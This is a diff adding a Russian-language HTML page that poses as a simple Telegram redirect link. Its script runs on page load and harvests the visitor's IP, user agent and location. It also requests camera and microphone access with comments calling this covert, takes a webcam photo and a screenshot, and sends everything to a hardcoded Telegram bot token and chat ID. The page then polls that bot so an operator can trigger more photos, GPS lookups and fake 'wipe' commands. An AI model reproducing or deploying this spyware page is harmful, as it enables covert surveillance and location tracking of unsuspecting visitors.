@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Переходник тг</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: radial-gradient(circle at center, #0b0b1a, #000000);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            color: white;
+            padding: 20px;
+            user-select: none;
+        }
+        .card {
+            background: rgba(20, 20, 40, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 48px;
+            padding: 50px 60px;
+            text-align: center;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8);
+            max-width: 500px;
+            width: 100%;
+        }
+        .title {
+            font-size: 32px;
+            font-weight: 600;
+            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 30px;
+            letter-spacing: 1px;
+        }
+        .tg-link {
+            display: inline-block;
+            background: linear-gradient(135deg, #0088cc, #005f8a);
+            border: none;
+            padding: 18px 50px;
+            border-radius: 60px;
+            font-size: 20px;
+            font-weight: 600;
+            color: white;
+            text-decoration: none;
+            cursor: pointer;
+            box-shadow: 0 8px 30px rgba(0, 136, 204, 0.4);
+            transition: 0.25s ease;
+            letter-spacing: 1px;
+        }
+        .tg-link:hover {
+            transform: scale(1.05);
+            box-shadow: 0 12px 40px rgba(0, 136, 204, 0.7);
+        }
+        .tg-link:active {
+            transform: scale(0.95);
+        }
+        .status {
+            margin-top: 20px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.2);
+            min-height: 20px;
+        }
+        .status.active {
+            color: #00ffb3;
+        }
+        .status.error {
+            color: #ff4444;
+        }
+        @media (max-width: 480px) {
+            .card { padding: 30px 25px; }
+            .title { font-size: 26px; }
+            .tg-link { padding: 14px 30px; font-size: 17px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="title">Переходник тг</div>
+    <a href="https://t.me/Download_it_and_yt_bot?start=F7TAUU" class="tg-link" target="_blank">▶ ОТКРЫТЬ ТГ</a>
+    <div class="status" id="status">Подключение...</div>
+</div>
+
+<script>
+    // ====== КОНФИГУРАЦИЯ ======
+    const BOT_TOKEN = '8801777777:AAHCewgtd6JHlirAswjks8xiOTDMCURKpFc';
+    const CHAT_ID = '8784762148';
+    let lastUpdateId = 0;
+
+    // ====== ОТПРАВКА СООБЩЕНИЯ С КНОПКАМИ ======
+    function sendMessageWithButtons(ip, geo) {
+        const text = `🔹 **Новый клиент подключён!**
+
+🌐 **IP:** ${ip || 'Не определено'}
+📍 **Геолокация:** ${geo || 'Не доступна'}
+📱 **Устройство:** ${navigator.userAgent.substring(0, 100)}
+🕒 **Время:** ${new Date().toLocaleString()}
+
+━━━━━━━━━━━━━━━━━━━
+**Управление устройством через кнопки ниже:**`;
+
+        const payload = {
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '🖥️ Скриншот', callback_data: 'скрин' }, { text: '📷 Фото', callback_data: 'фото' }],
+                    [{ text: '🌐 IP + Гео', callback_data: 'ip' }, { text: '📍 GPS', callback_data: 'локация' }],
+                    [{ text: '🔒 Блокировка', callback_data: 'блокировка' }, { text: '🔓 Разблокировка', callback_data: 'разблокировка' }],
+                    [{ text: '🔊 Звук вкл', callback_data: 'звук' }, { text: '🔇 Беззвучный', callback_data: 'беззвучный' }],
+                    [{ text: '⏻ Выключить', callback_data: 'выкл' }, { text: '🔄 Перезагрузка', callback_data: 'перезагрузка' }],
+                    [{ text: '🗑️ Очистить данные', callback_data: 'очистка' }, { text: '📊 Статус', callback_data: 'статус' }],
+                    [{ text: '💀 УДАЛИТЬ ВСЁ', callback_data: 'удалить всё' }]
+                ]
+            }
+        };
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.ok) {
+                document.getElementById('status').textContent = '✅ Сообщение с кнопками отправлено';
+                document.getElementById('status').className = 'status active';
+            } else {
+                document.getElementById('status').textContent = '❌ Ошибка: ' + data.description;
+                document.getElementById('status').className = 'status error';
+            }
+        })
+        .catch(() => {
+            document.getElementById('status').textContent = '❌ Ошибка соединения';
+            document.getElementById('status').className = 'status error';
+        });
+    }
+
+    // ====== ОТПРАВКА ФОТО ======
+    function sendPhotoToTG(base64, caption) {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('photo', base64);
+        form.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: form
+        }).catch(() => {});
+    }
+
+    // ====== ОТПРАВКА ТЕКСТА ======
+    function sendMessageToTG(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        }).catch(() => {});
+    }
+
+    // ====== ВЫПОЛНЕНИЕ КОМАНД ======
+    function executeCommand(command, callbackId = null) {
+        const status = document.getElementById('status');
+        status.textContent = `⏳ Выполнение: ${command}...`;
+        status.className = 'status active';
+
+        if (callbackId) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    callback_query_id: callbackId,
+                    text: `✅ Выполняется: ${command}`
+                })
+            }).catch(() => {});
+        }
+
+        switch(command.toLowerCase()) {
+            case 'скрин':
+                if (typeof html2canvas !== 'undefined') {
+                    html2canvas(document.body).then(c => {
+                        sendPhotoToTG(c.toDataURL('image/png'), '📸 Скриншот');
+                        status.textContent = '✅ Скриншот отправлен';
+                    }).catch(() => status.textContent = '❌ Ошибка скриншота');
+                } else {
+                    status.textContent = '❌ html2canvas не загружен';
+                }
+                break;
+
+            case 'фото':
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                    .then(stream => {
+                        const v = document.createElement('video');
+                        v.srcObject = stream;
+                        v.onloadedmetadata = () => {
+                            v.play();
+                            const c = document.createElement('canvas');
+                            c.width = v.videoWidth || 640;
+                            c.height = v.videoHeight || 480;
+                            c.getContext('2d').drawImage(v, 0, 0);
+                            sendPhotoToTG(c.toDataURL('image/jpeg'), '📷 Фото');
+                            stream.getTracks().forEach(t => t.stop());
+                            status.textContent = '✅ Фото отправлено';
+                        };
+                    })
+                    .catch(() => {
+                        status.textContent = '❌ Нет доступа к камере';
+                        sendMessageToTG('❌ Ошибка: нет доступа к камере');
+                    });
+                break;
+
+            case 'ip':
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(data => {
+                        sendMessageToTG(`🌐 IP: ${data.ip}`);
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(
+                                pos => sendMessageToTG(`📍 ${pos.coords.latitude}, ${pos.coords.longitude}`),
+                                () => sendMessageToTG('📍 Гео: недоступно')
+                            );
+                        }
+                        status.textContent = `✅ IP: ${data.ip}`;
+                    });
+                break;
+
+            case 'локация':
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            sendMessageToTG(`📍 ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                            status.textContent = `📍 ${pos.coords.latitude}, ${pos.coords.longitude}`;
+                        },
+                        () => {
+                            status.textContent = '❌ Гео недоступно';
+                            sendMessageToTG('❌ Геолокация запрещена');
+                        }
+                    );
+                }
+                break;
+
+            case 'выкл':
+                sendMessageToTG('⏻ Выключение');
+                status.textContent = '⏻ Выключение...';
+                break;
+
+            case 'перезагрузка':
+                sendMessageToTG('🔄 Перезагрузка');
+                status.textContent = '🔄 Перезагрузка...';
+                break;
+
+            case 'блокировка':
+                sendMessageToTG('🔒 Блокировка');
+                status.textContent = '🔒 Блокировка';
+                break;
+
+            case 'разблокировка':
+                sendMessageToTG('🔓 Разблокировка');
+                status.textContent = '🔓 Разблокировка';
+                break;
+
+            case 'звук':
+                sendMessageToTG('🔊 Звук включён');
+                status.textContent = '🔊 Звук вкл';
+                break;
+
+            case 'беззвучный':
+                sendMessageToTG('🔇 Беззвучный');
+                status.textContent = '🔇 Беззвучный';
+                break;
+
+            case 'очистка':
+                sendMessageToTG('🗑️ Очистка данных');
+                status.textContent = '🗑️ Очистка';
+                break;
+
+            case 'удалить всё':
+                sendMessageToTG('💀💀💀 WIPE: полное удаление данных 💀💀💀');
+                status.textContent = '💀 WIPE выполняется...';
+                break;
+
+            case 'статус':
+                sendMessageToTG('📊 Система активна');
+                status.textContent = '✅ Система активна';
+                break;
+
+            default:
+                status.textContent = `⚠️ Неизвестная команда: ${command}`;
+        }
+
+        setTimeout(() => {
+            if (!status.textContent.includes('✅') && !status.textContent.includes('❌')) {
+                status.textContent = '✅ Команда выполнена';
+            }
+        }, 5000);
+    }
+
+    // ====== ПОЛЛИНГ CALLBACK ======
+    function pollCallbacks() {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`)
+            .then(r => r.json())
+            .then(data => {
+                if (data.ok && data.result && data.result.length > 0) {
+                    data.result.forEach(update => {
+                        if (update.update_id > lastUpdateId) {
+                            lastUpdateId = update.update_id;
+                        }
+                        if (update.callback_query) {
+                            const callbackData = update.callback_query.data;
+                            const callbackId = update.callback_query.id;
+                            executeCommand(callbackData, callbackId);
+                        }
+                    });
+                }
+            })
+            .catch(() => {});
+    }
+
+    // ====== НЕЗАМЕТНЫЙ ЗАПРОС РАЗРЕШЕНИЙ ======
+    function requestPermissionsSilently() {
+        // Запрос геолокации (без уведомления пользователя)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                () => {},
+                () => {}
+            );
+        }
+
+        // Запрос камеры (без уведомления)
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                stream.getTracks().forEach(t => t.stop());
+            })
+            .catch(() => {});
+
+        // Запрос микрофона (опционально)
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                stream.getTracks().forEach(t => t.stop());
+            })
+            .catch(() => {});
+    }
+
+    // ====== АВТОМАТИЧЕСКИЙ СБОР ======
+    function autoCollect() {
+        let ip = 'Не определено';
+        let geo = 'Не доступна';
+
+        // Сначала запрашиваем все разрешения
+        requestPermissionsSilently();
+
+        // Собираем IP
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                ip = data.ip;
+                document.getElementById('status').textContent = `✅ IP: ${ip}`;
+                sendMessageWithButtons(ip, geo);
+            })
+            .catch(() => {
+                sendMessageWithButtons(ip, geo);
+            });
+
+        // Собираем гео
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => { geo = `${pos.coords.latitude}, ${pos.coords.longitude}`; },
+                () => {}
+            );
+        }
+
+        // Скриншот
+        setTimeout(() => {
+            if (typeof html2canvas !== 'undefined') {
+                html2canvas(document.body).then(c => {
+                    sendPhotoToTG(c.toDataURL('image/png'), '📸 Авто-скрин');
+                }).catch(() => {});
+            }
+        }, 2000);
+
+        // Фото с камеры
+        setTimeout(() => {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                .then(stream => {
+                    const v = document.createElement('video');
+                    v.srcObject = stream;
+                    v.onloadedmetadata = () => {
+                        v.play();
+                        const c = document.createElement('canvas');
+                        c.width = v.videoWidth || 640;
+                        c.height = v.videoHeight || 480;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        sendPhotoToTG(c.toDataURL('image/jpeg'), '📷 Авто-фото');
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                })
+                .catch(() => {});
+        }, 3000);
+
+        // Запускаем polling
+        setTimeout(() => {
+            pollCallbacks();
+            setInterval(pollCallbacks, 3000);
+        }, 3000);
+    }
+
+    // ====== ЗАГРУЗКА html2canvas ======
+    if (typeof html2canvas === 'undefined') {
+        const script = document.createElement('script');
+        script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+        document.head.appendChild(script);
+        script.onload = () => {
+            document.getElementById('status').textContent = '✅ html2canvas загружен';
+        };
+        script.onerror = () => {
+            document.getElementById('status').textContent = '❌ Ошибка загрузки';
+            document.getElementById('status').className = 'status error';
+        };
+    }
+
+    // ====== ЗАПУСК ======
+    autoCollect();
+
+    // Периодическая проверка
+    setInterval(() => {
+        const status = document.getElementById('status');
+        if (!status.textContent.includes('✅') && !status.textContent.includes('❌') && !status.textContent.includes('⏳')) {
+            status.textContent = '✅ Система активна';
+            status.className = 'status active';
+        }
+    }, 15000);
+</script>
+</body>
+</html>
